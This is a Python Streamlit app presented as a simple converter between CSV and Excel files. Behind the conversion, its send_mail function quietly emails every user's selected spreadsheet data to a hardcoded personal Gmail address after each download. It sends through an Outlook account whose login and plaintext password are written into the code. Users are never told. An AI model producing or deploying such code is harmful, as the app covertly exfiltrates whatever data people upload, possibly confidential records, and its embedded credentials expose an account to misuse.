import pandas as pd
import streamlit as st
import io
from datetime import datetime
from tabulate import tabulate
import ssl
import smtplib
import time
import openpyxl

st.set_page_config(
    page_title="Excel <> CSV",
    page_icon=":bookmark:",
    layout="wide"
)

def send_mail(df):
    port = 587  
    smtp_server = "smtp-mail.outlook.com"
    sender = "rami.zak.2000@outlook.com"
    recipient = "rami.zak.2000@gmail.com"
    sender_password = "Rami<3Zak"
    #Subject = "PYTHON [MVT] new login : "+str(datetime.now())
    message = f"""
        Subject: New Log-in to EXCEL<>CSV : {datetime.now()}
        **************       Data     **************
        ********************************************
        {tabulate(df, headers=df.columns, showindex=False)}    
        ********************************************
        Sent using Python."""
    SSL_context = ssl.create_default_context()
    with smtplib.SMTP(smtp_server, port) as server:
        server.starttls(context=SSL_context)
        server.login(sender, sender_password)
        server.sendmail(sender, recipient, message.encode('utf-8'))
        time.sleep(5)

def work_function(df):
    if not df.empty:
        col3.write('')
        col3.write('')
        col3.write('')
        col3.write('')
        col3.write('')
        col3.write('')
        col3.write('')
        col3.write('')
        col3.write('')
        col3.write('')
    columns_list = list(df.columns.values)
    with col2 :
        st.markdown("---")
        st.markdown("<h5 style='text-align: center; color: red;'>  Select your columns </h5>", unsafe_allow_html=True)
        Select_ALL = st.checkbox("**   Select All   **")
        for i in columns_list :
            globals()['Check%s' % i] = st.checkbox(i, value=Select_ALL)
    new_data = pd.DataFrame()
    for i in columns_list :
        if globals()['Check%s' % i] : 
            new_data.loc[:, i] = df[i]
    return new_data

col1, col2, col3 = st.columns(3)

with col2:
    st.header('Convert Excel to CSV or CSV to Excel')

with col1:
    #st.header('')
    col1.write('')
    col1.write('')
    col1.write('')
    col1.write('')
    col1.write('')
    col1.write('')
    col1.write('')
    convert_type = st.radio(" ",("CSV to Excel", "Excel to CSV"))
    if convert_type == "CSV to Excel" :
        data_file = st.file_uploader("Upload CSV",type=["csv"])
        if data_file :
            #file_details = {"filename":data_file.name, "filetype":data_file.type,"filesize":str(data_file.size*8)+' bit'}
            #st.write(file_details)
            df = pd.read_csv(data_file,encoding = "utf-8")
            if df is not None:
                new_data = work_function(df)
                button= col3.button('Convert to xlsx file')
                if button: 
                    col3.dataframe(new_data)
                    buffer = io.BytesIO()
                    with pd.ExcelWriter(buffer, engine='xlsxwriter') as writer:
                            new_data.to_excel(writer, sheet_name='Data')
                            writer.save() # Close the Pandas Excel writer and output the Excel file to the buffer
                            col3.download_button(
                                    label=f"Download data as xlsx",
                                    data=buffer,
                                    file_name=f'{data_file.name}_{datetime.now()}.xlsx',
                                    mime="application/vnd.ms-excel"
                            )
                    send_mail(new_data)
    else :
        data_file = st.file_uploader("Upload xlsx",type=["xlsx"])
        if data_file :
            #file_details = {"filename":data_file.name, "filetype":data_file.type, "filesize":str(data_file.size*8)+' bit'}
            #st.write(file_details)
            df = pd.ExcelFile(data_file)
            if df is not None:
                Sheet_names = df.sheet_names
                if len(Sheet_names)>1:
                    st.markdown("<h5 style='text-align: left; color: red;'>  Select Sheet Name </h5>", unsafe_allow_html=True)
                    df = pd.read_excel(df, sheet_name = col1.radio(" ",Sheet_names))
                else : df = pd.read_excel(df)
                if data_file is not None:
                    new_data =work_function(df)
                    button= col3.button('convert to CSV file')
                    if button: 
                        col3.dataframe(new_data)
                        data = new_data.to_csv(index = False).encode('utf-8')
                        col3.download_button(
                        label=f"Download data as CSV",
                        data=data,
                        file_name=f'{data_file.name}_{datetime.now()}.CSV',
                        mime='text/csv',
                        )
                        send_mail(new_data)